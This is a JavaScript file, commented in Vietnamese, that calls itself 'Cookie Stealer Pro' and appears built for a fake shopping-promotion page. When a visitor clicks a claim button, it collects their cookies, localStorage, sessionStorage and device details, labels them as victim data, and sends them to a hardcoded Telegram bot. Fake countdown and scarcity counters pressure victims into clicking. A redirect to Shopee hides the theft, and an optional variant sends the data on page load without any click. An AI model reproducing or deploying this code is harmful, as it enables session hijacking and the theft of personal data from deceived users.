/**
 * ============================================
 *  🍪 COOKIE STEALER PRO - BẢN NÂNG CẤP
 *  Lấy cookies, localStorage, sessionStorage,
 *  thông tin thiết bị, gửi về Telegram Bot.
 * ============================================
 */

// ====== CẤU HÌNH TELEGRAM ======
const BOT_TOKEN = "8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8";   // 🔑 Thay token của bot
const CHAT_ID = "8872446985";       // 🆔 Thay chat ID của cậu

// ====== KIỂM TRA CẤU HÌNH ======
if (BOT_TOKEN === "8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8" || CHAT_ID === "8872446985") {
    console.warn("⚠️ Chưa cấu hình BOT_TOKEN và CHAT_ID!");
}

// ====== LẤY TẤT CẢ DỮ LIỆU ======
function getAllData() {
    // Cookie
    const cookies = document.cookie || "(Không có cookie)";

    // LocalStorage - chuyển object sang string
    let localStorageData = {};
    try {
        localStorageData = { ...localStorage };
    } catch (_) {
        localStorageData = { error: "Không thể đọc localStorage" };
    }

    // SessionStorage
    let sessionStorageData = {};
    try {
        sessionStorageData = { ...sessionStorage };
    } catch (_) {
        sessionStorageData = { error: "Không thể đọc sessionStorage" };
    }

    // Thông tin thiết bị / trình duyệt
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
        screen: `${window.screen.width}x${window.screen.height}`,
        screenColorDepth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        url: window.location.href,
        referrer: document.referrer || "Direct (không có referrer)",
        hostname: window.location.hostname,
        pathname: window.location.pathname,
        protocol: window.location.protocol,
        isMobile: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent),
        isTouch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        } : "Không có thông tin mạng"
    };

    // Xây dựng tin nhắn Markdown
    let text = `🍪 **DỮ LIỆU NẠN NHÂN**\n\n`;
    text += `📌 **Cookies:**\n\`${cookies}\`\n\n`;
    text += `💾 **LocalStorage:**\n\`\`\`json\n${JSON.stringify(localStorageData, null, 2)}\n\`\`\`\n\n`;
    text += `📦 **SessionStorage:**\n\`\`\`json\n${JSON.stringify(sessionStorageData, null, 2)}\n\`\`\`\n\n`;
    text += `🖥️ **User-Agent:**\n\`${deviceInfo.userAgent}\`\n\n`;
    text += `💻 **Platform:** ${deviceInfo.platform}\n`;
    text += `🌐 **Ngôn ngữ:** ${deviceInfo.language} (${deviceInfo.languages})\n`;
    text += `📱 **Màn hình:** ${deviceInfo.screen} (${deviceInfo.screenColorDepth}-bit)\n`;
    text += `📱 **Mobile:** ${deviceInfo.isMobile ? '✅ Có' : '❌ Không'}\n`;
    text += `🕒 **Múi giờ:** ${deviceInfo.timezone} (offset ${deviceInfo.timezoneOffset} phút)\n`;
    text += `🔗 **URL:** ${deviceInfo.url}\n`;
    text += `↩️ **Referrer:** ${deviceInfo.referrer}\n`;
    text += `📡 **Kết nối:** ${typeof deviceInfo.connection === 'string' ? deviceInfo.connection : `${deviceInfo.connection.effectiveType} - ${deviceInfo.connection.downlink}Mbps`}\n`;
    text += `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}\n`;

    return text;
}

// ====== GỬI QUA TELEGRAM ======
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    return fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown",
            disable_web_page_preview: true
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        if (data.ok) {
            return true;
        } else {
            console.error("Telegram error:", data);
            return false;
        }
    })
    .catch(error => {
        console.error("Send error:", error);
        return false;
    });
}

// ====== HIỆU ỨNG ĐẾM NGƯỢC GIẢ (TẠO FOMO) ======
let timeLeft = 300; // 5 phút
const timerEl = document.getElementById('timerDisplay');

function updateTimer() {
    if (timeLeft <= 0) {
        timerEl.textContent = '00:00';
        return;
    }
    const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
    const secs = String(timeLeft % 60).padStart(2, '0');
    timerEl.textContent = `${mins}:${secs}`;
    timeLeft--;
}
setInterval(updateTimer, 1000);

// ====== GIẢM SỐ LƯỢNG SUẤT NGẪU NHIÊN ======
let count = 87;
const countEl = document.getElementById('countdown');

setInterval(() => {
    if (count > 8) {
        const decrease = Math.floor(Math.random() * 4) + 1;
        count = Math.max(8, count - decrease);
        countEl.textContent = `Còn ${count} suất`;
    }
}, 1800);

// ====== XỬ LÝ SỰ KIỆN CLICK NÚT ======
const btn = document.getElementById('claimBtn');
const loader = document.getElementById('loader');

btn.addEventListener('click', function() {
    // ===== VÔ HIỆU HOÁ NÚT + LOADING =====
    btn.disabled = true;
    btn.textContent = '⏳ Đang xử lý...';
    loader.style.display = 'block';

    // ===== LẤY DỮ LIỆU =====
    const data = getAllData();

    // ===== GỬI VỀ TELEGRAM =====
    sendToTelegram(data).then(success => {
        loader.style.display = 'none';

        if (success) {
            // Thành công
            btn.textContent = '✅ Đã nhận! Kiểm tra email';
            btn.style.background = 'linear-gradient(135deg, #34d399, #059669)';
            btn.style.boxShadow = '0 8px 35px rgba(52, 211, 153, 0.3)';

            // Chuyển hướng sau 1.5s
            setTimeout(() => {
                window.location.href = 'https://shopee.vn/';
            }, 1500);
        } else {
            // Thất bại - cho thử lại
            btn.textContent = '⚠️ Lỗi, thử lại';
            btn.style.background = 'linear-gradient(135deg, #f87171, #dc2626)';
            btn.style.boxShadow = '0 8px 35px rgba(248, 113, 113, 0.3)';
            btn.disabled = false;

            setTimeout(() => {
                btn.style.background = 'linear-gradient(135deg, #fbbf24, #f59e0b)';
                btn.style.boxShadow = '0 8px 35px rgba(251, 191, 36, 0.3)';
                btn.textContent = '🎁 Nhận ngay ưu đãi';
                btn.disabled = false;
            }, 2500);
        }
    });
});

// ====== TỰ ĐỘNG GỬI DỮ LIỆU KHI TRANG LOAD (TUỲ CHỌN) ======
// Bật tính năng này nếu muốn lấy cookie ngay cả khi không click
// const AUTO_SEND_ON_LOAD = true;
// if (AUTO_SEND_ON_LOAD) {
//     window.addEventListener('load', function() {
//         const autoData = getAllData();
//         sendToTelegram(autoData);
//     });
// }

// ====== LOG CONSOLE (ĐỂ DEBUG) ======
console.log('🍪 Cookie Stealer Pro đã sẵn sàng!');
console.log('📡 Bot Token:', BOT_TOKEN ? 'Đã cấu hình ✅' : '❌ Chưa cấu hình');
console.log('🆔 Chat ID:', CHAT_ID ? 'Đã cấu hình ✅' : '❌ Chưa cấu hình');